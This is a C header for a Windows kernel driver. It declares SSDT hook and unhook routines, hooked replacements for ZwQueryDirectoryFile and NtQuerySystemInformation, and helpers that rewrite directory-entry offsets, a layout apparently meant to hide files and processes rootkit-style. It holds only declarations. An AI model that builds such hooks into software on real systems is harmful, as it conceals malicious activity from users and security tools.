#ifndef _SSDT_HOOK_H_
#define _SSDT_HOOK_H_

#include <ntifs.h>

// SSDT Hook
BOOLEAN SSDTHook();

// SSDT Unhook
BOOLEAN SSDTUnhook();

PVOID SSDTHook1(PCHAR funName, PVOID funHook);

NTSTATUS New_ZwQueryDirectoryFile(
	IN HANDLE               FileHandle,
	IN HANDLE               Event OPTIONAL,
	IN PIO_APC_ROUTINE      ApcRoutine OPTIONAL,
	IN PVOID                ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK    IoStatusBlock,
	OUT PVOID               FileInformation,
	IN ULONG                Length,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN              ReturnSingleEntry,
	IN PUNICODE_STRING      FileMask OPTIONAL,
	IN BOOLEAN              RestartScan
);

NTSTATUS New_NtQuerySystemInformation(
	ULONG InfoClass,
	PVOID Buffer,
	ULONG Length,
	PULONG ReturnLength
);

typedef struct _SYSTEM_PROCESS_INFO
{
	ULONG                  NextEntryOffset;
	ULONG                  NumberOfThreads;
	LARGE_INTEGER          Reserved[3];
	LARGE_INTEGER          CreateTime;
	LARGE_INTEGER          UserTime;
	LARGE_INTEGER          KernelTime;
	UNICODE_STRING        ImageName;
	ULONG                  BasePriority;
	HANDLE                ProcessId;
	HANDLE                InheritedFromProcessId;
}SYSTEM_PROCESS_INFO, * PSYSTEM_PROCESS_INFO;

VOID GetEntryFileName(IN PVOID pData, IN FILE_INFORMATION_CLASS FileInfo, PWCHAR pwszFileName, ULONG ulBufferSize);

VOID SetNextEntryOffset(IN PVOID pData, IN FILE_INFORMATION_CLASS FileInfo, IN ULONG Offset);

ULONG GetNextEntryOffset(IN PVOID pData, IN FILE_INFORMATION_CLASS FileInfo);

PVOID Hook(ULONG ServiceNumber, PVOID Hook);

PVOID g_pOldSSDTFunctionAddress;
PVOID g_pOldSSDTFunctionAddress1;
PVOID g_pOldSSDTFunctionAddress2;


#endif